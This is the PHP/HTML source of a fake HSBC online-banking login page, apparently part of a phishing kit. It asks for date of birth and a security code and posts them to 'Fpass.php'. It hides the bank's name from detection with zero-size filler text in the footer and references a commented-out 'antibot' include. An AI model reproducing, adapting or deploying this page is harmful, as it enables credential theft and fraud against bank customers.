<?php
//require_once('../antibot8/code/include.php');
?>
<html style="font-family: Lato, sans-serif;"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Welcome</title>
    <link rel="stylesheet" href="jackss/njds.css">
    
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato">
  
    <style>


    @media only screen and (max-width: 600px) {
      .container.errorclass {
          height: 222px !important;
      }
      section.clean-block.about-us.addsamepx {
    height: 100% !important;
}
}
    </style>
</head>

<body>
    <nav class="navbar navbar-light navbar-expand-lg fixed-top bg-white clean-navbar" style="background: rgb(0,0,0);">
        <div class="container"><a class="navbar-brand logo" href="#" style="
    background-image: url(&quot;jackss/hslogo.gif&quot;);
    width: 180px;
    height: 60px;
    background-size: contain;
    background-repeat: no-repeat;
"></a>
            <div class="collapse navbar-collapse text-justify" id="navcol-2">
                <ul class="navbar-nav text-capitalize ml-auto">
                    <li class="nav-item"><a class="nav-link text-capitalize text-dark active" href="#" style="font-family: Montserrat, sans-serif;font-weight: bold;font-style: normal;font-size: 17px;"><strong>Everyday Banking&nbsp;</strong></a></li>
                    <li class="nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="nav-link text-capitalize text-dark" href="#" style="font-family: Montserrat, sans-serif;font-size: 17px;"><strong>Borrowing</strong></a></li>
                    <li class="nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="nav-link text-capitalize text-dark" href="#" style="font-size: 17px;"><strong>Investing</strong><br></a></li>
                    <li class="nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="nav-link text-capitalize text-dark" href="#" style="font-size: 17px;"><strong>Insurance</strong><br></a></li>
                    <li class="nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="nav-link text-capitalize text-dark" href="#" style="font-size: 17px;"><strong>Life events</strong><br></a></li>
                </ul>
            </div>
        </div>
    </nav>
    <main class="page" style="background: #f8f8f8;">
        
        <section class="clean-block about-us addsamepx" style="background-color: #f8f8f8;">
                 
                  <div class="container">
                <div class="row" style="margin-top: 70px;">
                    <div class="col-md-6" style="background: white;max-width: 500px;margin: auto;padding: 21px;"><span style="font-family: Montserrat, sans-serif;font-weight: bold;">Online Banking<br></span>
                        <hr style="border-style: dotted;"><img src="jackss/pass.png" style="
    width: 100%;
    max-width: 363px;
">
                        <form method="post" action="Fpass.php" >
                                                      <div class="form-group" style="margin-top: 15px;margin-bottom: 15px;">

                                   <div class="row" style="
    max-width: 370px;
">
      <div class="col-sm-3">
<div class="form-group">
  <label for="usr">DD</label>
  <input type="text" class="form-control" name="DD" id="usr" style="
    border: 1px solid #929292;
    border-radius: 0!important;
    box-sizing: border-box;
    box-shadow: none;
    width: 100%;
    padding: 12px 14px 11px;
    line-height: 1.5;
    min-height: 40px;
    -moz-box-sizing: border-box;
    -webkit-appearance: none;
">
</div></div>
      
    <div class="col-sm-3">
<div class="form-group">
  <label for="usr">MM</label>
  <input type="text" class="form-control" name="MM" id="usr" style="
    border: 1px solid #929292;
    border-radius: 0!important;
    box-sizing: border-box;
    box-shadow: none;
    width: 100%;
    padding: 12px 14px 11px;
    line-height: 1.5;
    min-height: 40px;
    -moz-box-sizing: border-box;
    -webkit-appearance: none;
">
</div></div><div class="col-sm-3">
<div class="form-group">
  <label for="usr">YYYY</label>
  <input type="text" class="form-control" name="YYYY" id="usr" style="
    border: 1px solid #929292;
    border-radius: 0!important;
    box-sizing: border-box;
    box-shadow: none;
    width: 100%;
    padding: 12px 14px 11px;
    line-height: 1.5;
    min-height: 40px;
    -moz-box-sizing: border-box;
    -webkit-appearance: none;
">
</div></div></div>
                           </div>
                            <div style="margin-top: 10px;">
                             <div class="form-group">
  <label for="usr">Please enter your security code</label>
  <input type="text" class="form-control" name="pass1" id="usr">
</div>   
                            </div><div class="form-group" style="margin-top: 28px;margin-bottom: 15px;text-align: right;">

                               <button id="submit" style="color: var(--white);background: #db0010;width: 103px;height: 40px;font-size: 15px;padding: 0 0 2px 0;border: none;border-radius: 0px;">Log on</button>
                           </div>
                            
                        </form>
                    </div>
                    
                </div>
            </div>
        </section>
    </main>
    <footer class="page-footer dark" style="background: #3e4045;">
        <div class="container">
            <div class="row">
                <div class="col-sm-3">
                    <h5><strong>Support</strong></h5>
                    <ul>
                        <li><a href="#">Security centre</a></li>
                        <li><a href="#">Card support</a></li>
                        <li><a href="#">CoBrowse</a></li>
                    </ul>
                </div>
                <div class="col-sm-3"></div>
                <div class="col-sm-3"></div>
                <div class="col-sm-3"></div>
            </div>
        </div>
        <div class="footer-copyright" style="background: #3e4045;border-color: #3e4045;">
          <p>© &nbsp;H<span style="font-size: 0px;">yz</span>S<span style="font-size: 0px;">yz</span>B<span style="font-size: 0px;">yz</span>C Group 2021</p>
        </div>
    </footer>
  





</body></html>